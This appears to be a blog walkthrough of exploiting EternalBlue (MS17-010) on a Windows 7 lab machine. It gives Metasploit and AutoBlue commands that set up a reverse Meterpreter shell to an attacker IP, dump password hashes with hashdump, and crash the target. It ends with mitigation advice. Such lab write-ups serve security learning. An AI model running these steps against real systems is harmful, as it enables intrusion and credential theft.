
## Understanding EternalBlue

EternalBlue is an exploit developed by the NSA and leaked by the Shadow Brokers in 2017. It targets a flaw in Microsoft’s implementation of the SMB protocol, specifically versions 1.0, enabling attackers to send specially designed packets to a vulnerable system. This exploit gained notoriety due to its use in the WannaCry ransomware attack, which caused widespread damage across the globe.

## Key Characteristics

- **Vulnerability ID**: MS17–010
- **CVE Identifiers**:
- **CVE-2017–0144**: Related to remote code execution through the SMBv1 protocol.
- **CVE-2017–0145**: Related vulnerability affecting the SMB protocol.
- **CVE-2017–0146**: Another associated vulnerability.
- **Affected Systems**: Windows 7, Windows Server 2008, and earlier versions with SMB v1 enabled.
- **Impact**: Remote Code Execution, allowing attackers to gain full control of the system.

## Initial Reconnaissance

To assess the target, I performed a comprehensive `nmap` scan on all ports

```c
sudo nmap -p- 192.168.17.135 -oN nmap.txt
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*eww8l-hJt4phjODo5JUHrQ.png)

Subsequent scans provided detailed service information about open ports, particularly noting the SMB service on the Windows 7 Ultimate OS:

```c
sudo nmap -p- -A -T4 192.168.17.135 -oN nmap.txt
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*wIiAK1j7rW_4vRDwTPW7IA.png)

## Identifying Exploitation Opportunities

A search for known exploits targeting Windows 7 Ultimate systems yielded useful information for both manual and automated exploitation:

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*zARu2pcEYuZILMx5tZCrMw.png)

## Automated Exploit via Metasploit

The Rapid7 site provided an exploit module suitable for our needs, specifically targeting MS17–010.

- [MS17–010 EternalBlue SMB Remote Windows Kernel Pool Corruption](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*3wwRu49wGlzCrpVOxqSj6w.png)

## Local Privilege Escalation

Another exploit could be leveraged for privilege escalation once we gain access to the machine.

- [Microsoft Windows 7 Local Privilege Escalation CVE-2019–1132](https://www.exploit-db.com/exploits/47176)
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*7ZYX06l6nUxE-gGOkwG4Mg.png)

## Manual Exploit

A Python-based exploit also met the criteria for the vulnerability.

- [EternalBlue SMB Remote Code Execution CVE-2017–0144](https://www.exploit-db.com/exploits/42315)
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*jgVUunoFDNhwVgSHlwWKNg.png)

## Understanding the Vulnerability

To further comprehend MS17–010, I consulted Microsoft’s security bulletin, which outlines the vulnerability’s impact and mitigation strategies:

- [Microsoft Security Bulletin MS17–010 — Critical](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

## Automated Exploitation with Metasploit

I initiated the exploitation process by launching Metasploit and searching for relevant modules:

```c
msfconsole
search eternalblue
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*U2QElpu0MUvuBTmlllO_8A.png)

Next, I identified an auxiliary SMB scanner module to verify if the target was vulnerable. I selected option 3 and configured the required settings:

```c
use 3
options
```

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*k-7iS8WiMDgmmp3G25jfjw.png)

After running the scan, the results indicated a vulnerability to MS17–010:

```c
setg RHOSTS 192.168.17.135
run
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GfAsDsOTdAzK6IP0-fSkYg.png)

I then proceeded to find the appropriate exploit module for MS17–010:

```c
search eternalblue
use 0
```

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*vCMWhDlhwCOu5fin86omSQ.png)

Before executing the exploit, I verified that all required options were set, ensuring to specify the LHOST IP address of my attacker machine:

```c
options
```

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*vHLIIAKwLf-1prezYMLw9A.png)

To further confirm the target’s vulnerability, I executed:

```c
check
```

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*2nWh-1Gzx5OmZc6oAUJq1A.png)

I then set the payload for a 64-bit reverse TCP Meterpreter shell:

```c
set payload windows/x64/meterpreter/reverse_tcp
run
```

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*rQ_oPLfXby0oJoKgcvnBmQ.png)

Upon successful exploitation, I established a Meterpreter session on the target machine:

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*G4qrU5T5WcIPk1w6ixY4Bw.png)

## Post-Exploitation: Extracting Password Hashes

With the session active, I executed the hashdump command to retrieve password hashes from the system:

```c
hashdump
```

This command provided the administrator account’s password hash, enabling further actions using tools like Hashcat or John the Ripper to crack the password and gain elevated access.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*pF4KCeiKntCVVC9O86S6dg.png)

## Manual Exploitation

An additional Google search for EternalBlue exploits led to the discovery of this particular exploit that seems easier to achieve our goal:

- [AutoBlue-MS17–010 hosted by 3ndG4me](https://github.com/3ndG4me/AutoBlue-MS17-010)

I cloned this repo to the /opt directory on my Kali machine:

```c
sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*5dI6aAXUV8dLTPvuH9QSDw.png)

Next, I implemented the requirements per the directions listed on the exploit’s repo page to meet the Python 3 requirement:

```c
pip install -r requirements.txt
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*lKmSDrwJPbHT0EHkutcQFw.png)

Running the checker, we see that the target is not patched and, therefore, vulnerable to this exploit:

```c
python eternal_checker.py 192.168.17.135
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*mjb5Gi7CCjlDQR5d0aU7pQ.png)

Next, I navigated to the shellcode directory to execute the shell prep script and provided the following inputs for the Eternal Blue Windows Shellcode Compiler:

```c
cd shellcode
sudo ./shell_prep.sh
192.168.17.134  # LHOST for reverse connection
9999             # LPORT for x64
2222             # LPORT for x86
1                # Type 1 for a regular staged cmd shell
0                # Type 0 for a Meterpreter shell
```

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*ylWYoCANjUr5rC-yMoCjZA.png)

## Listener Prep

Next, I executed the listener prep script to provide the configuration settings needed to establish a listener in Metasploit that would accept incoming connections from the target machine once the exploit is executed.

```c
cd ..
sudo ./listener_prep.sh
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GhM5ZyCjfaT5QjzXQYKeNg.png)

## Time to run the exploit:

```c
python eternalblue_exploit7.py 192.168.17.135 shellcode/sc_all.bin
```
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*bHEf1bonesdcJDcPDoU8hg.png)

In this case, the exploit crashed the target machine, resulting in the Blue screen:

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*Xls-TEibdOdM6ErC3rUMxQ.png)

## Mitigation Strategies

To protect against the exploitation of EternalBlue, organizations and individuals should implement the following strategies:

- **Patch Systems**: Regularly apply security updates and patches provided by Microsoft. The patch for MS17–010 was released in March 2017; ensure it is installed on all systems.
- **Disable SMBv1**: As SMBv1 is outdated and insecure, disable it on all systems unless absolutely necessary.
- **Network Segmentation**: Isolate critical systems from general access. Implement strict firewall rules to limit SMB traffic.
- **Intrusion Detection Systems (IDS)**: Utilize IDS to monitor for suspicious traffic patterns indicative of an EternalBlue exploit attempt.
- **Regular Backups**: Maintain regular backups of critical data to mitigate the impact of ransomware attacks.

The Eternal Blue vulnerability continues to pose significant risks to unpatched systems. Through a combination of effective reconnaissance and exploitation techniques, this walkthrough demonstrates the process of compromising a vulnerable Windows 7 machine. To protect against such vulnerabilities, regular patching, proper configuration, and monitoring are essential.

Thank you for reading!

- NotesByNisha

Nisha is a Cybersecurity Engineer who enjoys learning new things! [https://notesbynisha.com/](https://notesbynisha.com/)

## More from Nisha P

## Recommended from Medium

[

See more recommendations

](https://medium.com/?source=post_page---read_next_recirc--1ef4145f51ed---------------------------------------)